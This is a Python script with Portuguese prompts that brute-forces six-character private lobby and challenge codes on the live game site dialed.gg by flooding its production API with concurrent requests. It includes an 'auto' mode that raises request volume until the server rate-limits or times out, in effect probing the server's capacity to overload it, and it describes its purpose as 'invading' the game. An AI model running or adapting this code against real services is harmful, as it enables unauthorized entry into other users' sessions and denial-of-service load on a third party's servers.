try:
     import httpx
except ModuleNotFoundError:
     print('Você não instalou a biblioteca httpx')

import string
import itertools
import time
import secrets
import asyncio


numbers = list(range(10))
caracters = list(string.ascii_uppercase) + numbers
debug = False
keep_timeouterror = False # Default False

async def teste_post(client, gamemode):
     a_code = []
     for i in range(1, 7):
          a_code.append(secrets.choice(caracters))

     payload = {
          'code': "".join(map(str, a_code)),
          'name': 'A'
     }

     url = f'https://dialed-api-production.onrender.com/api/{gamemode}/lobby/join'
     resposta = await client.post(url, json=payload)

     return resposta.status_code

async def teste_get(client, gamemode):
     a_code = []
     for i in range(1, 7):
          a_code.append(secrets.choice(caracters))

     url = f'https://dialed-api-production.onrender.com/api/{gamemode}/challenge/{"".join(map(str, a_code))}'
     resposta = await client.get(url)

     return resposta.status_code

async def teste(multplayer, gamemode, vezes):
     mode_url = ''
     if gamemode == '1':
          mode_url = 'color'

     elif gamemode == '2':
          mode_url = 'color2'

     elif gamemode == '3':
          mode_url = 'sound'

     elif gamemode == '4':
          mode_url = 'time'

     elif gamemode == '5':
          mode_url = 'shape'
     try:
          time.sleep(3)
          async with httpx.AsyncClient(timeout=7.0) as client:
               if multplayer == '1':
                    tarefa = [teste_post(client, mode_url) for i in range(vezes + 1)]
               else:
                    tarefa = [teste_get(client, mode_url) for i in range(vezes + 1)]

               resposta = await asyncio.gather(*tarefa)
               print(resposta)
               tolerancia = 10
               tol = 0
               for i in resposta:
                    if i == 429:
                         tol += 1
                         if tol == tolerancia:
                              return True
               else:
                    return False
     except httpx.TimeoutException:
          return True

print('--------------------------------\n')
print('TESTADOR DE PARAMETROS DE URL DO DIALED\n')
print('Criado por Jjonasxd\n')
print('Atenção!')
print('Esse programa pode sobrecarregar sua maquina, pois ele pode testar até 36⁶, possibilidades')
print('Apenas use se estiver consiente, e não use para o mal!\n')
print('--------------------------------')

if not debug:
     print('-------------------')
     print('Escolha o gamemode para invadir o DIALED')
     print('1. Color')
     print('2. Color2')
     print('3. Sound')
     print('4. Time')
     print('5. Shape')
     print('-------------------\n')

     gamemode = input('$: ')

     while gamemode not in list(map(str, range(1, 6))): # eu poderia fazer uma lista mais quis fazer assim mesmo ;)
          print('Gamemode Invalido - Tente Novamente')
          gamemode = input('$: ')

     print('-------------------')
     print('Escolha o modo multplayer')
     print('1. Lobby + Provavel')
     print('2. Challenge + Rapido')
     print('-------------------')

     multplayer = input('$: ')

     while multplayer not in ['1', '2']:
          print('Modo Multiplayer Invalido - Tente Novamente')
          multplayer = input('$: ')


     print('-------------------')
     print('Escolha o modo de ataque')
     print('1. Casa por Casa')
     print('2. Invasão por aleatoriedade Obs: eu particurlamente gosto mais desse')
     print('-------------------')

     ataque = input('$: ')

     while ataque not in ['1', '2']:
           print('Modo de Ataque Invalido - Tente Novamente')
           ataque = input('$: ')

     if multplayer == '1':
          print('Nome de usuario:')
          user = input('$: ')

     print('-------------------')
     print('Quantidade de vezes por requisição, Recomendado (Demora um pouco em rotas POST): auto')
     print('-------------------')
     quant = input('$: ').lower()

     if quant == 'auto':
          print('Rodando modo automatico de maxima requisição')
          print('---------------')

          for i in range(10000):
               res = asyncio.run(teste(multplayer, gamemode, i))
               if res:
                    print(f'\n\n\n\n\n\n\n\n\nO sevidor aguenta até {i} de uma vez\n')
                    quant = i
                    break

     else:
          while not quant.isnumeric() or int(quant) <= 0:
               print('Quantidade de vezes invalida')
               quant = input('$: ')

else:
     gamemode = '1'
     multplayer = '1'
     ataque = '2'
     user = 'Admin'


base_url_api = 'https://dialed-api-production.onrender.com'
mode_url = ''
parameter_url = ''
base_url = 'https://dialed.gg'

if gamemode == '1':
     mode_url = 'color'

elif gamemode == '2':
     mode_url = 'color2'

elif gamemode == '3':
     mode_url = 'sound'

elif gamemode == '4':
     mode_url = 'time'

elif gamemode == '5':
     mode_url = 'shape'

if multplayer == 1:
     parameter_url = 'l'
else:
     parameter_url = 'c'

def incomodo(bool):
     if gamemode == '1':
          url_final = f'{base_url}?{parameter_url}='

          if bool:
               print('----------------')
               print(f'URL para ser invadida: {url_final}')
               print('----------------')
     else:
          url_final = f'{base_url}/{mode_url}?{parameter_url}='

          if bool:
               print('----------------')
               print(f'URL para ser invadida: {url_final}')
               print('----------------')
     if bool:
          print('----------------')
          print('Pronto para começar')
          print('----------------')
          start = input('Y/N: ').lower()

     if not bool:
          return url_final

     
     
     while True:
          if start == 'y':
               break
          elif start == 'n':
               raise KeyboardInterrupt('Você abortou esse programa parabens! >:(')
          else:
               print('Tente Novamente')
               start = input('Y/N: ').lower()

async def fazer_requisicao_get(client, codigo, url):
     resposta = await client.get(url)
     return resposta.status_code, codigo, 'GET'

async def fazer_requisicao_post(client, code, url):
     payload = {
          'code': code,
          'name': user
     }
     resposta = await client.post(url, json=payload)

     return resposta.status_code, code, 'POST'

async def main(url, multiplayers, codes):
     try:
          async with httpx.AsyncClient(timeout=10.0) as client:
               if multiplayers == '1':
                    tarefas = [fazer_requisicao_post(client, codigo, url) for codigo in codes]
               else:
                    tarefas = [fazer_requisicao_get(client, codigo, f'{url}/{codigo}') for codigo in codes]
               resultados = await asyncio.gather(*tarefas)

               print('------------------------------------------------------')
               for status, code, type in resultados:
                    print('')
                    if type == 'POST':
                         print(f'\r{status} - https://dialed-api-production.onrender.com/api/{mode_url}/lobby/join, METHOD=POST, CODE={code}', end='', flush=True)

                         if status not in [404, 429]:
                              print(f'\nAchei um codigo disponivel: {code} URL: {incomodo(False)}{code}')
                              break
                    else:
                         print(f'\r{status} - https://dialed-api-production.onrender.com/api/{mode_url}/challenge/{code}, METHOD=GET, CODE={code}', end='', flush=True)

                         if status not in [404, 429]:
                              print(f'\nAchei um codigo disponivel: {code} URL: {incomodo(False)}{code}')
                              break

               else:
                    print('')
                    print('------------------------------------------------------\n')
                    return False, False
               print('')
               print('------------------------------------------------------\n')
               return True, False
     except httpx.TimeoutException:
          return False, keep_timeouterror

# Deixei isso aqui so para lembrar que eu ia fazer desse jeito    
"""def mandar_requisicao_post(code):
     payload = {
          "code": code,
          "name": user
     }
     url = f'{base_url_api}/api/{mode_url}/lobby/join'
     resposta = requests.post(url, json=payload)

     return resposta.status_code


def mandar_requisicao_get(code):
     url = f'{base_url_api}/api/{mode_url}/challenge/{code}'

     resposta = requests.get(url)

     return resposta.status_code, url"""

keep = True

if ataque == '1':
     incomodo(True)

     list_codigo = []
     for i in itertools.product(caracters, repeat=6):
          codigo = "".join(map(str, i))
          list_codigo.append(codigo)

          if len(list_codigo) >= int(quant):
               if multplayer == '1':
                    res, erro = asyncio.run(main(f'https://dialed-api-production.onrender.com/api/{mode_url}/lobby/join', '1', list_codigo))
                    list_codigo = []
                    if erro:
                         raise TimeoutError('O Tempo do seridor expirou')
                    if res:
                         break
               else:
                    res, erro = asyncio.run(main(f'https://dialed-api-production.onrender.com/api/{mode_url}/challenge', '2', list_codigo))
                    list_codigo = []

                    if erro:
                         raise TimeoutError('O Tempo do seridor expirou')
                    
                    if res:
                         break
     else:
          print('Codigo não encontrado - Tente Novamente Mais tarde')
else:
     print('\nTestar url quantas vezes | Permitido Numeros grandes ;)')
     vezes = input('$: ')

     while not vezes.isnumeric() or int(vezes) <= 0:
          print('Valor Invalido ou Incorreto - Tente Novamente')
          vezes = input('$: ')

     incomodo(True)

     a_codigo = []
     list_codigo = []

     for vez in range(int(vezes)):
          for n in range(6):
               letra = secrets.choice(caracters)
               a_codigo.append(str(letra))

          codigo = "".join(a_codigo)
          a_codigo = []
          list_codigo.append(codigo)
          list_codigo.append('8SCGNS')

          if len(list_codigo) >= int(quant) or (vez + 1) == int(vezes):
               if multplayer == '1':
                    res, erro = asyncio.run(main(f'https://dialed-api-production.onrender.com/api/{mode_url}/lobby/join', '1', list_codigo))
                    list_codigo = []
                    list_codigo.append('8SCGNS')

                    if erro:
                         raise TimeoutError('O Tempo do seridor expirou')
                    if res:
                         break
               else:
                    res, erro = asyncio.run(main(f'https://dialed-api-production.onrender.com/api/{mode_url}/challenge', '2', list_codigo))
                    list_codigo = []

                    if erro:
                         raise TimeoutError('O Tempo do seridor expirou')
                    if res:
                              break
     else:
          print(f'Codigo testado {vez} vezes não encontrado - Tente Novamente Mais tarde e com mais sorte')